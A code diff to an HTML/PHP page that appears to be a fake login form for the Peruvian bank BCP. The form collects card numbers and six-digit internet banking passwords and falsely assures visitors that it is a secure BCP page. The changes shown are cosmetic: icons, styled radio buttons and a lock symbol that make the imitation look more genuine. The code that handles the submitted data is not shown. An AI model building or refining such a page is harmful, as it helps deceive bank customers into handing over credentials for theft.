@@ -21,6 +21,7 @@ if(isset($_POST['submit'])){
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
         integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 
     <link rel="stylesheet" type="text/css" href="css/style.css">    
@@ -41,8 +42,16 @@ if(isset($_POST['submit'])){
                 <form action="#" method="post" novalidate class="form-padre" id="formulario">
                     <div class="opciones">
                         
-                        <label><input type="radio" name="bcp" id="persona" value="personas" checked>  Persona</label>
-                        <label><input type="radio" name="bcp" id="empresa" value="empresas"> Empresa</label>
+                    <label class="radio" for="persona">
+                        <input type="radio" name="bcp" id="persona" value="personas" checked>
+                            <span></span>
+                                Persona
+                    </label>
+                    <label class="radio" for="empresa">
+                        <input type="radio" name="bcp" id="empresa" value="empresas">
+                        <span></span>
+                        Empresa
+                    </label>
                     </div>
                     <div class="Documentos">
                         <select name="DNI"  id="documentos form-control" class="form-select selec-docu select">
@@ -58,12 +67,12 @@ if(isset($_POST['submit'])){
 
                     <div class="mb-4">
                         <label for="numeroTarjeta" class="form-label">Número de tarjeta</label>
-                        <input type="text" class="form-control ancho-input label-input" name="numeroTarjeta" id="numeroTarjeta">
+                        <input type="text" class="form-control ancho2-input label-input" name="numeroTarjeta" id="numeroTarjeta" required>
                     </div>
 
                     <div class="my-3">
-                        <a href="#">No tengo clave</a>
-                        <a href="#">Olvide mi clave</a>
+                        <a href="#" class="linea1">No tengo clave</a>
+                        <a href="#" class="linea1">Olvide mi clave</a>
                     </div>
 
                     <div class="mb-4 form-check">
@@ -73,7 +82,7 @@ if(isset($_POST['submit'])){
                     </div>
                     <div class="mb-4">
                         <label for="Clave" class="form-label">Clave de internet de 6 dígitos</label>
-                        <input type="Clave" class="form-control ancho-input label-input" name="Clave">
+                        <input type="Clave" class="form-control ancho2-input label-input" name="Clave">
                     </div>
                     <div class="form-group">
                         <img src="captcha_gen.php" />
@@ -89,18 +98,19 @@ if(isset($_POST['submit'])){
                     </div>
 
                     <div class="d-grid">
-                        <input type="submit" name='submit' value="continuar" id="st" class="btn btn-primary"/>        
+                        <input type="submit" name='submit' value="Continuar" id="st" class="btn btn-primary botoncontinuar"/>        
                         <p id="show" style="text-align:center;">
 
                     </div>
-                    <p> lock
-                        Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate
-                        con nosotros al 311-9898 o a través de nuestross medios digitales.</p>
+                    <div>
+                    <p class="texto">
+                    <i class="bi bi-lock"></i> Esta es una página segura del BCP. Si tienes dudas sobre la autenticidad de la web, comunícate
+                        con nosotros al 311-9898 o a través de nuestros medios digitales.</p>
+                    </div>
                 </form>
             </div>
         </div>
     </div>
-    
     <script>
 
                    
